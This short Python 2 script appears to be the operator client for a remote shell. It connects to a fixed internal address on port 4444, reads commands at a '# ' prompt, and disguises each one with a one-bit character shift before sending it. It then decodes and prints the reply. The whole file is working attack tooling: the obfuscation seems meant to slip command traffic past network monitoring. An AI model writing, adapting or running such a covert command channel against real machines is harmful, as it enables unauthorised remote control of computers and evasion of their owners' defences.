import socket
import sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ("172.16.0.201",4444)
print >>sys.stderr, 'Connecting to %s, port %s' % server_address
sock.connect(server_address)

try:
	while True:
		cmd = raw_input('# ')
		cmd = cmd.strip()
		message = ''
		for i in cmd:
			tempint = ord(i) << 1
			message += chr(tempint)
		sock.sendall(message)
		data = sock.recv(2048)
		message = ''
		for i in data:
			tempint = ord(i) >> 1
			message += chr(tempint)
		print message

finally:
	print >>sys.stderr, 'Closing socket'
	sock.close()
